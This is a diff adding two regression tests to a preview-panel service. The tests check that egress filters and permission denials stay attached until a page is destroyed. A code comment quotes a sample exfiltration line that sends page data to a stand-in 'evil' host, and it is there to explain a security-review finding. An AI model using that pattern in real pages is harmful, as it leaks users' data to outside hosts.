@@ -1289,6 +1289,35 @@ describe('PreviewViewService — partition hand-back', () => {
     expect(destroyedAt).toBeLessThan(releasedAt)
   })
 
+  it('keeps the filter, the protocol handler and the permission denials attached until the page is destroyed', async () => {
+    // Security review: detaching them first left the hostile page up to ~3 s
+    // with no egress gate and default permission handlers — a queued
+    // `location.href = 'https://evil/?' + data` landed the moment the
+    // `will-navigate` lock went, with nothing left to cancel the request.
+    const h = makeHarness()
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.close('panel-A')
+
+    const destroyedAt = h.factory.destroy.mock.invocationCallOrder[0]
+    const detachedAt = (h.session.teardown as ReturnType<typeof vi.fn>).mock.invocationCallOrder[0]
+    expect(detachedAt).toBeGreaterThan(destroyedAt)
+  })
+
+  it('does not hand the partition back when the detach threw', async () => {
+    // A name that goes back with a stale handler attached would make the next
+    // open on it fail at `attachProtocol`; dropping it is the safe outcome.
+    const h = makeHarness()
+    ;(h.session.teardown as ReturnType<typeof vi.fn>).mockImplementationOnce(() => {
+      throw new Error('unhandle failed')
+    })
+    await h.service.open(REQUEST_A, h.window)
+
+    await h.service.close('panel-A')
+
+    expect(h.session.release).not.toHaveBeenCalled()
+  })
+
   it('hands back a session that was built but never installed', async () => {
     const h = makeHarness()
     const build = h.sessionCreate.getMockImplementation()
